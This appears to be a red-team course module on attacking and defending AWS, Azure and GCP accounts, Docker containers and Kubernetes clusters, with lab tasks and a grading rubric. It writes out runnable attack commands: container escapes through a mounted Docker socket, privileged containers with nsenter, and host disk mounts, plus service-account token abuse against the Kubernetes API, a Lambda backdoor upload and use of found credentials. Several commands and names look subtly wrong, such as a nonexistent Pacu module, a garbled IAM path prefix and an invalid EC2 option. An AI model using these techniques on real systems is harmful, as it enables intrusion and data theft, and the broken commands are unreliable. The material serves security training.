# Module 16: Cloud & Container Security

## Objectives
- Understand cloud attack surfaces (AWS, Azure, GCP)
- Exploit IAM misconfigurations and privilege escalation paths
- Perform container escape and Kubernetes attacks
- Identify cloud storage and service vulnerabilities
- Defend cloud and container environments

---

## 16.1 Cloud Security Fundamentals

Cloud environments introduce unique security challenges — traditional network perimeters dissolve, and identity becomes the primary security boundary. Understanding cloud-specific attack paths is essential for modern red teaming.

### Shared Responsibility Model

| Model | Provider Responsibility | Customer Responsibility |
|-------|------------------------|------------------------|
| **IaaS (EC2, VMs)** | Physical security, hypervisor, network infrastructure | OS, apps, data, IAM, network configs |
| **PaaS (RDS, Lambda)** | Above + runtime, middleware | Apps, data, IAM, configs |
| **SaaS (Office 365, Salesforce)** | Above + application | Data, IAM, user configs |

**Red team implication:** In IaaS, you can target the OS and network. In PaaS/SaaS, you're limited to the application layer, data, and IAM. Knowing where the boundary is tells you what you can attack.

---

## 16.2 AWS Attack Surface

### AWS IAM (Identity and Access Management)

IAM is the most critical AWS service from a security perspective — it controls who can do what.

#### IAM Privilege Escalation Paths

| Path | Description | Difficulty |
|------|-------------|------------|
| **iam:CreateUser + iam:AttachUserPolicy** | Create a new user and give it admin rights | Low (if you have these permissions) |
| **iam:CreateAccessKey + iam:AttachUserPolicy** | Create keys for an existing user and attach admin policy | Low |
| **iam:AttachGroupPolicy / iam:ReplaceGroupPolicy** | Add admin policy to a group you're in | Low |
| **iam:PassRole + iam:CreateRole + iam:AttachRolePolicy** | Create a role with admin rights and pass it to a service (e.g., EC2, Lambda) | Medium |
| **iam:CreatePolicyVersion** | Create a new version of an existing policy with elevated rights | Low (if you can create policy versions on a policy attached to you or your group) |
| **iam:SetDefaultPolicyVersion** | Reactivate an older, more permissive policy version | Low (if old versions exist) |
| **iam:AddUserToGroup** | Add yourself to a privileged group (e.g., Administrators) | Low (if you have this permission) |
| **iam:UpdateLoginProfile** | Create/modify a login profile for a user (including yourself if you can modify your own profile) | Low |

```bash
# Example: enumerate your AWS permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <your-username>
aws iam list-groups-for-user --user-name <your-username>
aws iam list-policies --scope Local   # Customer-created policies

# Check for privilege escalation opportunities
# Using Pacu (AWS exploitation framework)
pacu --profile <profile_name>
pacu> run iam__enauth_token
pacu> run iam__privesc_scan

# Or using CloudSploit, PMapper, or manual enumeration
```

#### IAM Enumeration

```bash
# Who am I?
aws sts get-caller-identity

# What can I do?
aws iam list-attached-user-policies --user-name <username>
aws iam list-groups-for-user --user-name <username>
aws iam list-roles --path-prefix /seed invade/  # Roles you can assume

# What services can I access?
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
aws iam list-policies --scope Local

# Check for specific privilege escalation paths
aws iam list-policies --query 'Policies[?PolicyName==`<policy_name>`].PolicyVersionList[].VersionId'
aws iam get-policy-version --policy-arn <arn> --version-id <version_id>
```

### S3 (Simple Storage Service)

S3 buckets are frequently misconfigured and exposed.

```bash
# Enumerate S3 buckets
aws s3 ls
aws s3api list-buckets

# Check bucket permissions
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api get-bucket-policy --bucket <bucket-name>
aws s3api get-bucket-policy-status --bucket <bucket-name>

# Check for public access
aws s3api get-public-access-block --bucket <bucket-name>

# List and download objects
aws s3 ls s3://<bucket-name>
aws s3 cp s3://<bucket-name>/file.txt .

# If you find credentials in a bucket:
cat credentials.txt
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
```

**Common S3 misconfigurations:**
- Public read access to sensitive buckets
- Bucket policies that allow access from other AWS accounts
- Credentials stored in S3 (backup files, config files, environment files)
- Logging disabled (can't see who accessed the bucket)
- Encryption not enabled

**Tools:** S3Scanner, Bucket Finder, AWS CLI, Pacu (s3__enum)

### EC2 (Elastic Compute Cloud)

EC2 instances are essentially cloud VMs. Attack paths include:

```bash
# Enumerate instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PrivateIpAddress,PublicIpAddress,Tags]' --output table

# Check security groups (firewall rules)
aws ec2 describe-security-groups --group-ids <sg-id>

# If you have IAM permissions to manage instances:
aws ec2 start-instances --instance-ids <instance-id>
aws ec2 stop-instances --instance-ids <instance-id>
aws ec2 create-image --instance-id <instance-id> --name "backup"  # Snapshot the instance

# User data (instance initialization scripts) may contain secrets
aws ec2 describe-instances --instance-ids <instance-id> --query 'Reservations[*].Instances[*].UserData' --output text | base64 -d

# If you can modify instance attributes:
aws ec2 modify-instance-attribute --instance-id <instance-id> --launch-template launchTemplateId=lt-<id>  # Change launch template to one you control
```

### Lambda (Serverless)

Lambda functions can be targeted for code execution, data access, and privilege escalation.

```bash
# Enumerate Lambda functions
aws lambda list-functions
aws lambda get-function --function-name <function-name>

# Check Lambda permissions and environment variables (may contain secrets)
aws lambda get-function-configuration --function-name <function-name>

# If you can update a Lambda function:
aws lambda update-function-code --function-name <function-name> --zip-file fileb://backdoor.zip
aws lambda update-function-configuration --function-name <function-name> --environment "Variables={BACKDOOR=1}"

# Lambda IAM role abuse: if the function's role has permissions you want, invoke the function to access those permissions
```

### SSM (Systems Manager)

AWS Systems Manager provides remote management of EC2 instances. If misconfigured, it can be exploited.

```bash
# Check if you have SSM permissions
aws ssm describe-parameters    # Enumerate SSM parameters (may contain secrets)
aws ssm get-parameter --name <parameter-name> --with-decryption

# If you can run commands via SSM:
aws ssm send-command --instance-ids <instance-id> --document-name "AWS-RunShellScript" --parameters 'commands=["whoami"]'
```

### CloudTrail and Logging

CloudTrail logs API activity. Red teamers need to understand what's logged and how to minimize their footprint.

**What CloudTrail logs:**
- Every API call (who, what, when, where, result)
- Management events (control plane)
- Data events (S3 object-level, Lambda invoke, etc. — may need explicit enablement)

**Red team OPSEC with CloudTrail:**
- Understand what actions generate logs
- Minimize API calls to only what's necessary
- Use roles/permissions you already have rather than creating new ones (creating users/keys generates logs)
- Be aware that some actions can't be hidden from CloudTrail

---

## 16.3 Azure Attack Surface

### Azure AD (Entra ID) and IAM

Azure's identity service (now called Microsoft Entra ID) controls access to Azure resources.

```bash
# Using Azure CLI
az login   # Authenticate
az ad user list --show-mine    # Current user
az role assignment list --assignee <user-id>    # Roles assigned to you
az role definition list --output table    # Available roles

# Check your permissions
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv)

# Enumerate resource access
az vm list --output table
az storage account list
az functionapp list
```

#### Azure Privilege Escalation Paths

| Path | Description |
|------|-------------|
| **Owner role on a resource group** | Can grant yourself access to anything in the resource group |
| **User Access Administrator** | Can change access to any resource |
| **Contribution on a role assignment** | Can grant roles to others |
| **ARM template deployment** | Can deploy resources with elevated rights if the deployment service principal has rights |
| **Managed Identity abuse** | If you can modify a resource with a managed identity, you can use that identity's permissions |
| **ADD Security Admin / Privileged Role Admin** | Can escalate in Azure AD |

### Azure Storage

```bash
# Enumerate storage accounts
az storage account list --query "[?contains(name,'<keyword>')]"

# Check blob container access
az storage container list --account-name <account> --output table
az storage container show-permission --account-name <account> --name <container>

# Access public containers
az storage blob download-batch --account-name <account> --source <container> --destination .
```

---

## 16.4 GCP Attack Surface

### GCP IAM and Services

```bash
# Authenticate and enumerate
gcloud auth login
gcloud config list
gcloud projects list
gcloud services list

# Check current permissions
gcloud projects get-iam-policy <project-id>
gcloud beta asset search-all-iam-policies --query "policy:<project-id>"

# Enumerate compute instances
gcloud compute instances list
gcloud compute ssh <instance> --zone <zone>   # If you have SSH access

# Storage (GCS)
gsutil ls
gsutil ls -p <project-id>
gsutil ls gs://<bucket-name>/
gsutil cp gs://<bucket-name>/file.txt .
```

#### GCP Privilege Escalation
- **iam.policyAdmin:** Can modify IAM policies to grant yourself elevated rights
- **compute.instanceAdmin:** Can create/modify instances, potentially with service accounts you control
- **Service Account key creation:** If you can create keys for a service account, you can impersonate it
- **Kubernetes Engine admin:** Can access GKE clusters and their workloads

---

## 16.5 Container Security

### Container Escape

Containers are meant to be isolated, but misconfigurations and kernel vulnerabilities can allow escape to the host.

#### Common Container Escape Techniques

| Technique | Description | Requirements |
|-----------|-------------|--------------|
| **Docker socket mount** | Mount /var/run/docker.sock inside the container — allows creating new containers with host access | Docker socket accessible inside container |
| **Privileged container** | Container runs with --privileged — has access to host devices and capabilities | Container is privileged |
| **CAP_SYS_ADMIN** | Container has SYS_ADMIN capability — can use nsenter to escape | SYS_ADMIN capability |
| **Mounted host filesystem** | Host directories mounted into the container | Misconfigured volume mounts |
| **Kernel exploit** | Exploit a kernel vulnerability from inside the container | Vulnerable kernel, suitable exploit |
| **Overloaded capabilities** | Container has unnecessary Linux capabilities | Misconfigured capabilities |
| **Writeable host path** | Container can write to a host path that's executed by the host | Writable path on host that's executed |

#### Docker Socket Escape

```bash
# If /var/run/docker.sock is mounted inside the container:
ls -la /var/run/docker.sock

# Use the Docker CLI from inside the container to create a container on the host
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host bash

# Or create a privileged container that escapes:
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i bash
```

#### Privileged Container Escape

```bash
# Inside a privileged container:
# Access host devices
ls -la /dev/

# Mount the host filesystem
mkdir /host
mount /dev/sda1 /host   # Adjust device as needed
chroot /host bash

# Or use nsenter to enter the host's namespaces
nsenter -t 1 -m -u -n -i bash
```

#### cgroups Escape (older technique)

```bash
# In a container with write access to /proc/self/cgroup
# and certain conditions, you can escape via cgroup notify_on_release
# This is mostly of historical/educational interest — modern kernels have mitigations
```

### Kubernetes Attacks

Kubernetes introduces additional attack surface — the cluster, pods, services, and RBAC.

```bash
# Inside a pod, check your environment
id
hostname
cat /etc/os-release
env | grep -i kubernetes
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Access the Kubernetes API from inside a pod
# The service account token is mounted at:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Query the API server
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods

# If the service account has too many permissions:
# List all pods cluster-wide
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/pods

# Exec into another pod (if you have the right permissions)
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" -X POST https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods/<pod-name>/exec -d "command=whoami"

# Check your service account's permissions
kubectl auth can-i --list   # If kubectl is available in the pod
kubectl auth can-i create pods
kubectl auth can-i delete pods
kubectl auth can-i get secrets
```

#### Kubernetes Privilege Escalation

| Path | Description |
|------|-------------|
| **Service account with excessive permissions** | pod's service account can access the API with elevated rights |
| **Cluster-admin binding to a service account** | The service account has full cluster control |
| **persistent volume with host path** | Pod writes to a host directory that's executed by the host |
| **Container escape via privileged pod** | A pod with privileged: true can escape to the node |
| **Node access** | Compromise a node to access all pods on that node |
| **etcd access** | Access the cluster's database — all secrets, configs |

#### Kubernetes RBAC Enumeration

```bash
# From outside the cluster (if you have kubeconfig with some access)
kubectl auth can-i --list
kubectl get roles --all-namespaces
kubectl get clusterroles
kubectl get rolebindings --all-namespaces
kubectl get clusterrolebindings

# Check what you can do
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i delete nodes

# If you find a role you can assume or a binding that grants you access:
kubectl get rolebindings <binding-name> -o jsonpath='{.subjects}'
```

---

## 16.6 Cloud Detection and Defense

### Cloud Detection Methods

| Method | What It Detects | Examples |
|--------|-----------------|----------|
| **CloudTrail / Azure Monitor / Cloud Audit Logs** | API calls, configuration changes, authentication events | CloudTrail in AWS, Azure Activity Log, GCP Cloud Audit Logs |
| **GuardDuty / Azure Security Center / Security Command Center** | Threat detection services with ML/anomaly detection | AWS GuardDuty, Azure Defender, GCP Security Command Center |
| **Config / Azure Policy / Security Command Center** | Configuration compliance and drift | AWS Config, Azure Policy, GCP Security Command Center |
| **VPC Flow Logs / NSG Flow Logs / VPC Flow Logs** | Network traffic analysis | VPC Flow Logs (AWS), NSG Flow Logs (Azure), VPC Flow Logs (GCP) |
| **Honeypots / decoy resources** | Access to decoy resources indicates compromise | Canary tokens, decoy S3 buckets, decoy VMs |

### Cloud Defense Recommendations

- **Least privilege IAM:** Grant only the permissions needed, nothing more
- **MFA everywhere:** Require MFA for all human users, especially admins
- **No public storage:** Ensure S3 buckets, Blob containers, GCS buckets are not publicly accessible
- **Encryption:** Use KMS/Key Vault for encryption at rest; TLS for data in transit
- **Logging and monitoring:** Enable CloudTrail/Audit Logs, set up alerts for suspicious activity
- **IAM access reviews:** Regularly audit who has what permissions
- **Container security:** Don't run privileged containers; don't mount the Docker socket; use read-only root filesystems; scan images for vulnerabilities
- **Kubernetes RBAC:** Use fine-grained RBAC; avoid cluster-admin for service accounts; use namespaces for isolation
- **Network segmentation:** Use security groups, NSGs, firewall rules to limit traffic between services
- **Secrets management:** Use Secrets Manager/Key Vault/Secret Manager, not environment variables or config files

---

## 16.7 Lab: Cloud & Container Security

### Setup
- AWS/Azure/GCP free tier or lab account (or a cloud simulation environment)
- A cloud environment with intentional misconfigurations for practice
- Docker and Kubernetes (Minikube, Kind, or a cloud Kubernetes service)
- IAM users/roles with progressively escalating permissions for practice

### Tasks

**Task 1: Cloud Environment Reconnaissance**
1. Authenticate to your cloud environment:
   ```bash
   # AWS
   aws sts get-caller-identity
   aws iam list-attached-user-policies --user-name <your-username>

   # Azure
   az login
   az ad user show --id <your-email>
   az role assignment list --assignee <your-user-id>

   # GCP
   gcloud auth login
   gcloud projects list
   gcloud projects get-iam-policy <project-id>
   ```
2. Enumerate your permissions and what you can access
3. Document what services are available, what permissions you have, and what resource types exist

**Task 2: IAM Privilege Escalation Path Identification**
1. Review your assigned policies/roles for privilege escalation opportunities
2. Check for common escalation paths:
   - Can you create users/roles/keys?
   - Can you attach policies to yourself or your group?
   - Can you create new policy versions?
   - Can you pass roles to services?
   - Can you add yourself to privileged groups?
3. Document which escalation paths are available to you (even if you don't exploit them — just identifying them is valuable)
4. Use a tool like Pacu (AWS) or Stormspotter (Azure) if available for automated enumeration

**Task 3: S3/Storage Bucket Enumeration**
1. List all S3 buckets (or Azure Blob containers / GCS buckets):
   ```bash
   aws s3 ls
   aws s3api list-buckets
   ```
2. For each bucket, check:
   - Is it publicly accessible?
   - What ACLs and policies are applied?
   - What objects are in it?
   - Are there any credentials or sensitive files?
3. If you find sensitive data, document it. If you find credentials, use them to access more resources (in the lab only).
4. Document all buckets found and their security posture

**Task 4: EC2/VM Enumeration and Exploitation**
1. List EC2 instances (or Azure VMs / GCP instances):
   ```bash
   aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PrivateIpAddress,PublicIpAddress,Tags]'
   ```
2. For each instance, check:
   - What security groups are applied (firewall rules)?
   - Is there a public IP?
   - What user data is configured (may contain secrets)?
   - What IAM role is attached (may have permissions you can exploit)?
3. If you have permission to manage instances, demonstrate:
   - Creating a snapshot/image of an instance
   - Modifying instance attributes
   - Accessing instance metadata (if you can reach the instance via SSM or other means)
4. Document findings

**Task 5: Container Escape Practice**
1. Set up a Docker container with a deliberate misconfiguration:
   - Mount the Docker socket: `docker run -v /var/run/docker.sock:/var/run/docker.sock ...`
   - Run privileged: `docker run --privileged ...`
   - Mount a host directory: `docker run -v /host/path:/container/path ...`
2. From inside the container, attempt to escape to the host:
   - Use the Docker socket to create a host-access container
   - Use nsenter from a privileged container
   - Access and modify host files via mounted directories
3. Document the escape method, what access you gained, and how the misconfiguration enabled it

**Task 6: Kubernetes Attack Path**
1. Set up a Kubernetes cluster with a deliberately misconfigured pod/service account
2. From inside the pod:
   - Access the Kubernetes API using the service account token
   - Enumerate what the service account can do
   - If the service account has excessive permissions, demonstrate accessing secrets, creating pods, or other elevated actions
3. If you can escape the container (from Task 5 conditions), attempt to access the node and other pods
4. Document the attack path and what each step achieved

**Task 7: Cloud Logging Analysis**
1. Review the cloud logs (CloudTrail, Azure Activity Log, etc.) for your lab activities
2. What did your actions look like in the logs?
3. What would a defender see? What alerts would fire?
4. Document which actions were most visible and which were less visible
5. Reflect on: how would you modify your approach to be less detectable (while staying within the rules of the engagement)?

**Task 8: Cloud Defense Recommendations**
1. Based on your lab findings, write a defense recommendation:
   - IAM: least privilege, MFA, access reviews, privilege escalation monitoring
   - Storage: block public access, encryption, access logging
   - Compute: patch management, minimal IAM roles on instances, user data protection
   - Containers: no privileged containers, no Docker socket mounts, image scanning, read-only root filesystems
   - Kubernetes: RBAC, pod security standards, network policies, secrets management
   - Logging and monitoring: enable all logs, set up alerts, regularly review
2. Prioritize by impact and feasibility
3. Document specific configuration changes that would mitigate the issues found

---

## 16.8 Expected Outcomes

By the end of this module, you should be able to:
- Enumerate cloud environments (AWS, Azure, GCP) and understand your permissions
- Identify IAM privilege escalation paths in cloud environments
- Exploit S3/blob storage misconfigurations
- Perform container escape techniques in lab environments
- Attack Kubernetes clusters from inside a compromised pod
- Understand what cloud activities are logged and how to analyze those logs
- Recommend cloud and container security improvements

---

## 16.9 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Cloud enumeration | 10 | Enumerates cloud environment, identifies services and permissions |
| IAM escalation path identification | 10 | Identifies privilege escalation opportunities in IAM |
| Storage enumeration | 10 | Finds and analyzes S3/blob buckets, identifies misconfigurations |
| Compute enumeration | 5 | Enumerates instances, checks security groups, user data, IAM roles |
| Container escape | 10 | Demonstrates container escape from misconfigured container |
| Kubernetes attack | 10 | Demonstrates Kubernetes API access and privilege abuse from pod |
| Cloud logging analysis | 5 | Analyzes cloud logs for own activities, assesses visibility |
| Defense recommendations | 10 | Specific, prioritized cloud and container security recommendations |
| **Total** | **70** | |

**Pass threshold:** 49/70 (70%)

### Report Requirements (5–6 pages)
1. Cloud environment overview — provider, project/account, services in use
2. IAM analysis — your permissions, escalation paths identified, risk assessment
3. Storage findings — buckets/containers found, public access, sensitive data, credentials
4. Compute findings — instances, security groups, user data, instance roles, potential access
5. Container escape — misconfiguration exploited, escape method, access gained
6. Kubernetes attack — service account permissions, API access, actions taken, impact
7. Cloud OPSEC analysis — what was visible in logs, what would a defender see
8. Defense recommendations — specific, prioritized cloud and container security improvements with implementation guidance
